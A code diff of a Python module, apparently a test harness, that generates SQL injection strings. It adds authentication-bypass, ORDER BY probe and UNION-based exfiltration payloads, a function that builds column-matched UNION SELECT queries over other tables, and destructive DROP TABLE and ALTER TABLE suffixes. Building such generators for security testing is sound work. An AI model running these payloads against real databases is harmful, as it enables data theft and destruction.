@@ -6,14 +6,22 @@ BASIC_TEXT_INPUT = "admin"
 
 EXFILTRATION_SUFFIXES = [
     "1' OR '1'='1",
+    "' or '1'='1",
     "1' OR '1'='1' -- ",
     "' OR ''='",
+    "' OR 1=1",
+    "' OR 'a'='a",
+    "admin'--",
+    "admin' #",
+    "' UNION SELECT NULL--",
+    "' OR '1'='1' /*",
+    "') OR ('1'='1",
+    "' OR 1=1 LIMIT 1--",
+    "1' ORDER BY 1--",
+    "1' ORDER BY 2--"
 ]
 
-### MAIN FUNCTIONS TO USE
-
-
-def generate_tainted_strings_for_exfiltration() -> list[str]:
+def generate_tainted_strings_for_exfiltration(table_settings_dict: dict[str, DB_table_settings], table_name: str) -> list[str]:
 
   tainted_text_inputs: list[str] = []
   for suffix in EXFILTRATION_SUFFIXES:
@@ -33,13 +41,43 @@ def generate_tainted_strings_for_corruption() -> list[str]:
 
 
 
-def generate_tainted_queries_for_exfiltration(basic_query: str) -> list[str]:
-  
-  tainted_queries: list[str] = []
-  for suffix in EXFILTRATION_SUFFIXES:
+def generate_tainted_queries_for_exfiltration(basic_query: str, table_settings_dict: dict[str, DB_table_settings], table_name: str) -> list[str]:
+    tainted_queries: list[str] = []
+    # Add basic exfiltration suffixes
+    for suffix in EXFILTRATION_SUFFIXES:
+        tainted_queries.append(basic_query + suffix)
+    
+    target_columns_count = len(table_settings_dict[table_name].column_names)
 
-    tainted_queries.append(basic_query + suffix)
-  return tainted_queries
+    # Get all tables except current one for union attack
+    other_tables = [settings for table, settings in table_settings_dict.items() if table != table_name]
+    if other_tables:
+        union_suffix = generate_union_suffix(other_tables, target_columns_count)
+        tainted_queries.append(basic_query + union_suffix)
+    
+    return tainted_queries
+
+def generate_union_suffix(other_tables: list[DB_table_settings], target_column_count: int) -> str:
+    union_parts = []
+    
+    for table_settings in other_tables:
+        columns = table_settings.column_names
+        table_name = table_settings.table_name
+        
+        # Take only needed columns or pad with NULLs to match target count
+        if len(columns) > target_column_count:
+            # Truncate columns if we have too many
+            selected_columns = columns[:target_column_count]
+            column_str = ", ".join(selected_columns)
+        else:
+            # Pad with NULLs if we have too few
+            column_str = ", ".join(columns)
+            null_padding = ", NULL" * (target_column_count - len(columns))
+            column_str += null_padding
+            
+        union_parts.append(f"SELECT {column_str} FROM {table_name}")
+    
+    return "' UNION " + " UNION ".join(union_parts) + "--"
 
 
 
@@ -56,21 +94,18 @@ def generate_tainted_queries_for_corruption(basic_query: str, table_settings_dic
   return tainted_queries
 
 
-
-### ASSISTING FUNCTIONS
-
 def generate_corruption_suffixes(db_table_settings: DB_table_settings) -> list[str]:
   table_name: str = db_table_settings.table_name
   column_names: list[str] = db_table_settings.column_names
   column_datatypes: list[str] = db_table_settings.column_datatypes
 
   CORRUPTION_SUFFIXES = [
-    f"'; DROP TABLE {table_name};--",
-    f"; DROP TABLE {table_name};--",
     f"'; ALTER TABLE {table_name} ADD COLUMN hacked_text_column TEXT; --",
     f"; ALTER TABLE {table_name} ADD COLUMN hacked_text_column TEXT; --",
     f"'; ALTER TABLE {table_name} ADD COLUMN hacked_int_column INT; --",
     f"; ALTER TABLE {table_name} ADD COLUMN hacked_int_column INT; --",
+    f"'; DROP TABLE {table_name};--",
+    f"; DROP TABLE {table_name};--",
   ]
   CORRUPTION_SUFFIXES.append( build_insert_suffixe(db_table_settings) )
   add_drop_column_suffixes(table_name, column_names, CORRUPTION_SUFFIXES)
@@ -146,6 +181,6 @@ if __name__ == '__main__':
 
   print("\nEXFILTRATION QUERIES : \n")
   basic_query += " WHERE department=\"marketing\""
-  exfiltration_queries: list[str] = generate_tainted_queries_for_exfiltration(basic_query)
+  exfiltration_queries: list[str] = generate_tainted_queries_for_exfiltration(basic_query, table_settings_dict, "employees")
   for query in exfiltration_queries:
     print(query)
